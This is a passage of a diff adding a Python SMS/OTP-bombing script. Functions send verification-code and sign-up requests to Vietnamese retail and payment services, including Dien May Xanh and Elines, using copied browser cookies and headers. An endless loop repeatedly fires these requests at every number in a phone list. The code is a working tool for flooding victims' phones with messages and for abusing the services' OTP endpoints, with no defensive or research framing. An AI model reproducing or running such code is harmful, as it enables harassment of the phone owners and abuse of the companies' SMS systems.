+        dmx=requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/Login/GetVerifyCode',headers={'Accept': '*/*','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(data)),'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'TBMCookie_3209819802479625248=952511001654583156+Kq58c0JL71VNY4qIA+b6twKrnA=; ___utmvm=###########; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%7D; _gcl_au=1.1.1295894269.1654583162; _gid=GA1.2.1063557601.1654583163; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ATZIKhAOnlOk2rhIVIlhM43rYtczsROjmwnO6XQ5ImffgeKwk5evQ4X6icPEgdcFuXdv_hs7rTtsxVY8-EdABP-9UMQFuuQBTRvz4S2ZJK6I6wovdiv_61CSKXpdW0nlcCQS5v0TmqdiFEM4gbH-nI; _ga=GA1.1.601716618.1654583163; cebs=1; _ce.s=v~c2e936833da79c01e9a67ef4f6f53f7c0d62a084~vpv~0; _fbp=fb.1.1654583166255.415003383; cebsp=1; _hjSessionUser_46615=eyJpZCI6Ijc4NzNkMDBlLTA1NDItNWNkZi1iYjk0LWYxZmQwMzMyNjU2NCIsImNyZWF0ZWQiOjE2NTQ1ODMxNjYyOTgsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_46615=eyJpZCI6IjMzZGUxYmQ3LWY2MmEtNGI0YS04ODk5LWUyNmYzZTVlZThiNyIsImNyZWF0ZWQiOjE2NTQ1ODMxNjc5NDYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; lhc_per=vid|b7525bc59cdbf4393f5e; MWG_ORDERHISTORY_SS=CfDJ8ATZIKhAOnlOk2rhIVIlhM4Zgk6ubxEBn5Ws%2FQ4qK1YwFTrNYJv27nzLUaqzfKWMRD3iJNwZr8x%2FlI4sxOSqKvV3Knwzvb%2FtFEoVJFxjBU5BGG%2B9dw7sRVSjY9SDs74jjb1MP8OyHrIWiUaX%2BVdmKvnnaIu7Ix5WavM%2B73Zd%2BLjN; SvID=new2693|Yp7vi|Yp7vd; _ga_Y7SWKJEHCE=GS1.1.1654583162.1.1.1654584891.60','Host': 'www.dienmayxanh.com','Origin': 'https://www.dienmayxanh.com','Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Requested-With': 'XMLHttpRequest'},data=data).json()
+        print('DIEN MAY XANH =>',i,dmx)
+    except:pass
+def elines(i,phone):
+    try:
+        json={"phone":phone,"type":"sign_up"}
+        el=requests.post('https://www.elines.vn/api2/core/sendOTP',headers={'accept': '*/*','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-length': str(len(json)),'content-type': 'application/json','cookie': '_gcl_aw=GCL.1654609395.CjwKCAjw7vuUBhBUEiwAEdu2pLWq970FJT77fgpCTaGocfsQNTTknhfhNm3R8zrNAnCPC01vq-aAKxoCSO4QAvD_BwE; _gcl_au=1.1.1568085477.1654609395; __zi=3000.SSZzejyD7T8YXFszc1KMWo3Gu_EM3LNVCjhyuTGVGyazXFNaa5T7pJs6zgsOLqQ2EOJtfvbMHuiv.1; _ga=GA1.2.1116262771.1654609395; _gid=GA1.2.657006113.1654609395; _gac_UA-224922209-1=1.1654609395.CjwKCAjw7vuUBhBUEiwAEdu2pLWq970FJT77fgpCTaGocfsQNTTknhfhNm3R8zrNAnCPC01vq-aAKxoCSO4QAvD_BwE; _gat_UA-224922209-1=1; _fbp=fb.1.1654609395645.832381763','origin': 'https://www.elines.vn','referer': 'https://www.elines.vn/account/register','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36'},json=json).json()
+        print('ELINES =>',i,el)
+    except:pass
+i=0
+while(True):
+    for phone in list_phone:
+        i=i+1
+        tiki(i,phone)
+        i=i+1
+        momo(i,phone)
+        i=i+1;sleep(3)
+        vtpay(i,phone)
+        i=i+1;sleep(3)
+        tgdd(i,phone)
+        i=i+1;sleep(3)
+        grab(i,phone)
+        i=i+1;sleep(3)
+        bach_hoa_xanh(i,phone)
+        i=i+1;sleep(3)
+        dien_may_xanh(i,phone)
+        i=i+1;sleep(3)
+        elines(i,phone)
+        i=i+1;sleep(3)
